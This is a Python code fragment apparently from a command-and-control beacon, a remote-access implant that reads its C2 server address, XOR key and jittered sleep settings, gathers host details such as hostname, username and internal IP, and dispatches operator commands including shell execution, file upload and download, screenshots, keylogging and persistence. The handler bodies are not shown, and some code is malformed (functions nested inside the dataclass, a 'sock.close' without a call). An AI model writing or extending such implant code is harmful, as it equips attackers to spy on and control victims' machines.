@dataclass
class BeaconConfig:
    server_url: str = os.environ.get("C2_SERVER_URL",
                                     "ws://localhost:8000/ws/beacon")
    xor_key: str = os.environ.get("C2_XOR_KEY",
                                  "c2-beacon-default-key-change-me")
    sleep_interval: float = float(os.environ.get("C2_SLEEP", "3.0"))
    jitter_percent: float = float(os.environ.get("C2_JITTER", "0.3"))
    reconnect_base: float = 2.0
    reconnect_max: float = 300.0
    beacon_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    
    def collect_system_info() -> dict[str, Any]:
        return {
            "id": config.beacon_id,
            "hostname" : socket.gethostname(),
            "os" : f"{platform.system()} {platform.release()}",
            "username": os.getenv("USER", os.getenv("USERNAME", "unknown")),
            "pid" : os.getpid(),
            "internal_ip" : _get_internal_ip(),
            "arch" : platform.machine(), 
        }
    def _get_internal_ip() -> str:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(("10.255.255.255", 1))
            ip = sock.getsockname()[0]
            sock.close
            return ip
        except OSError:
            return "127.0.0.1"
    COMMAND_HANDLERS = {
        "shell": handle_shell,
        "sysinfo": handle_sysinfo,
        "proclist": handle_proclist,
        "upload": handle_upload,
        "download": handle_download,
        "screenshot": handle_screenshot,
        "keylog_start": handle_keylog_start,
        "keylog_stop": handle_keylog_stop,
        "persist": handle_persist,
        "sleep": handle_sleep,
    }
    async def dispatch(command: str, args: str | None) -> dict[str, Any]:
        handler = COMMAND_HANDLERS.get(command)
        if handler is None:
            return {"output":None, "error" : f"Unkown Command: {command}"}
        return await handler(args)
    